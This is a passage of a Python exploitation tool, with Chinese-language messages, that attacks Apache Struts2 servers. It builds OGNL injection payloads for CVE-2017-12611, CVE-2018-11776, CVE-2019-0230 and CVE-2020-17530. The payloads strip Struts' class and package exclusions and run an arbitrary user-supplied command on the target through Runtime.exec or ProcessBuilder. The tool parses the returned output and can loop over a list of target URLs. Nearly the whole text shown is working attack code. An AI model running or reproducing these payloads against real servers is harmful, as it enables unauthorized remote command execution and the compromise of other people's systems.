                    # "redirectUri": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='pwd').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n"}
                    "redirectUri": cve_2017_12611_pay}
                cve_2017_12611_req = requests.post(url, headers=cve_2017_12611_header, data=cve_2017_12611_data,
                                                   verify=False, timeout=timeout)
                # print(cve_2017_12611_req.text)
                etree_res = etree.HTML(cve_2017_12611_req.text)
                cve_2017_12611_result = etree_res.xpath('/html/body/p/text()')
                cve_2017_12611_str_result = "".join(cve_2017_12611_result)
                # print(cve_2017_12611_str_result)
                cve_2017_12611_f = re.sub(r'Your url: ', '', cve_2017_12611_str_result)
                print(cve_2017_12611_f)
            else :
                print("查看命令是否正确")

        if vul == "CVE-2018-11776" :
            if scan_url["file_path"] == "":
                    # url = urls_specification["site"] + urls_specification["file_path"] + "hello.action"
                scan_url["file_path"] = "/struts2-showcase/"
            # print(scan_url["file_path"])
            if scan_url["filename"] == "":
                    # url = urls_specification["site"] + urls_specification["file_path"] + "hello.action"
                scan_url["filename"] = "/actionChain1.action"
            if cmd == "path" :
                cve_2018_11776_pay = "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('pwd')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}"
                cve_2018_11776_pay_urllib = urllib.parse.quote(cve_2018_11776_pay, "utf-8")
                cve_2018_11776_url = scan_url["site"] + scan_url["file_path"] + cve_2018_11776_pay_urllib + scan_url["filename"]
                cve_2018_11776_req = requests.get(cve_2018_11776_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
                # print(cve_2018_11776_req.headers)
                # print(cve_2018_11776_req.headers.get("Location"))
                cve_2018_11776_req_header = cve_2018_11776_req.headers.get("Location")
                cve_2018_11776_f = re.sub(scan_url["file_path"], '', cve_2018_11776_req_header)
                cve_2018_11776_f_a = re.sub(r' /.*', '', cve_2018_11776_f)
                print(cve_2018_11776_f_a)
            elif cmd != "" :
                cve_2018_11776_pay = "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('" + cmd + "')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}"
                cve_2018_11776_pay_urllib = urllib.parse.quote(cve_2018_11776_pay, "utf-8")
                cve_2018_11776_url = scan_url["site"] + scan_url["file_path"] + cve_2018_11776_pay_urllib + scan_url[ "filename"]
                cve_2018_11776_req = requests.get(cve_2018_11776_url, headers=headers, verify=False, timeout=timeout,allow_redirects=False)
                # print(cve_2018_11776_req.headers)
                # print(cve_2018_11776_req.headers.get("Location"))
                cve_2018_11776_req_header = cve_2018_11776_req.headers.get("Location")
                cve_2018_11776_f = re.sub(scan_url["file_path"], '', cve_2018_11776_req_header)
                cve_2018_11776_f_a = re.sub(r' /.*', '', cve_2018_11776_f)
                print(cve_2018_11776_f_a)
            else :
                print("查看命令是否正确")

        if vul == "CVE-2019-0230" :
            if cmd != "" :
                cve_2019_0230_pay_one = "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
                cve_2019_0230_pay_two = "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('" + cmd + "'))}"
                cve_2019_0230_pay_one_urllib = urllib.parse.quote(cve_2019_0230_pay_one, "utf-8")
                cve_2019_0230_pay_two_urllib = urllib.parse.quote(cve_2019_0230_pay_two, "utf-8")
                cve_2019_0230_url_one = scan_url["site"] + scan_url["file_dir"] + "?id=" + cve_2019_0230_pay_one_urllib
                cve_2019_0230_url_two = scan_url["site"] + scan_url["file_dir"] + "?id=" + cve_2019_0230_pay_two_urllib
                cve_2019_0230_req_one = requests.get(cve_2019_0230_url_one , headers=headers , verify=False, timeout=timeout)
                cve_2019_0230_req_two = requests.get(cve_2019_0230_url_two , headers=headers , verify=False, timeout=timeout)
                if cve_2019_0230_req_one.status_code == "200" and cve_2019_0230_req_two.status_code == "200" :
                    print("该漏洞无回显")
                else :
                    print("该漏洞无回显")
            else :
                print("查看命令是否正确")

        if vul == "CVE-2020-17530" :
            if cmd == "path" :
                cve_2020_17530_url = scan_url["site"] + scan_url["file_dir"] + "?id=%25{('Powered_by_Unicode_Potats0%2cenjoy_it').(%23UnicodeSec+%3d+%23application['org.apache.tomcat.InstanceManager']).(%23potats0%3d%23UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(%23stackvalue%3d%23attr['struts.valueStack']).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get('context')).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get('memberAccess')).(%23emptySet%3d%23UnicodeSec.newInstance('java.util.HashSet')).(%23potats0.setBean(%23sm)).(%23potats0.put('excludedClasses'%2c%23emptySet)).(%23potats0.put('excludedPackageNames'%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance('freemarker.template.utility.Execute')).(%23cmd%3d{'pwd'}).(%23res%3d%23exec.exec(%23cmd))}"
                cve_2020_17530_req = requests.get(cve_2020_17530_url, headers=headers, verify=False, timeout=timeout)
                etree_res = etree.HTML(cve_2020_17530_req.text)
                result = etree_res.xpath('/html/body/a/@id')
                str_result = "".join(result)
                print(str_result)
            elif cmd != "" :
                cve_2020_17530_url = scan_url["site"] + scan_url["file_dir"] + "?id=%25{('Powered_by_Unicode_Potats0%2cenjoy_it').(%23UnicodeSec+%3d+%23application['org.apache.tomcat.InstanceManager']).(%23potats0%3d%23UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(%23stackvalue%3d%23attr['struts.valueStack']).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get('context')).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get('memberAccess')).(%23emptySet%3d%23UnicodeSec.newInstance('java.util.HashSet')).(%23potats0.setBean(%23sm)).(%23potats0.put('excludedClasses'%2c%23emptySet)).(%23potats0.put('excludedPackageNames'%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance('freemarker.template.utility.Execute')).(%23cmd%3d{'" + cmd +"'}).(%23res%3d%23exec.exec(%23cmd))}"
                cve_2020_17530_req = requests.get(cve_2020_17530_url, headers=headers, verify=False, timeout=timeout)
                etree_res = etree.HTML(cve_2020_17530_req.text)
                result = etree_res.xpath('/html/body/a/@id')
                str_result = "".join(result)
                print(str_result)
            else :
                print("查看命令是否正确")



    else :
        print("漏洞不存在")

def vulexp(url=url , vul=vul , cmd=cmd ,lists=lists) :
    if url :
        if vul :
            if not cmd :
                print("ERROR : 请输入命令！（-c/cmd）")
            else :
                print("[+] 正在执行命令，请稍后.....")
                exploit(url , vul , cmd)
        else :
            print("[+] 正在检测，请稍后.....")
            scanvul(url)
    else :
        print("ERROR : 请输入target url！（-u/--url）")
        return(0)

    if lists :
        URLs_List = []
        try:
            f_file = open(str(lists), "r")
            URLs_List = f_file.read().replace("\r", "").split("\n")
            try:
                URLs_List.remove("")
            except ValueError:
                pass
            f_file.close()
        except Exception as e:
            print("ERROR:读取列表文件时出错.")
            print("ERROR: " + str(e))
            exit(1)
        for url in URLs_List:
            if url :
                if vul:
                    if not cmd:
                        print("ERROR : 请输入命令！（-c/cmd）")
                    else:
                        print("[+] 正在执行命令，请稍后.....")
                        exploit(url, vul, cmd)
                else:
                    print("[+] 正在检测，请稍后.....")
                    scanvul(url)






if __name__ == "__main__":
    try :
        vulexp(url=url , vul=vul , cmd=cmd ,lists=lists)
    except KeyboardInterrupt:
        print("\nERROR：检测到访问异常.")
        print("[+] 正在退出...")
        exit(0)
    # exploit("http://127.0.0.1/","CVE-2020-17530","ls")
    # scanvul("http://127.0.0.1")



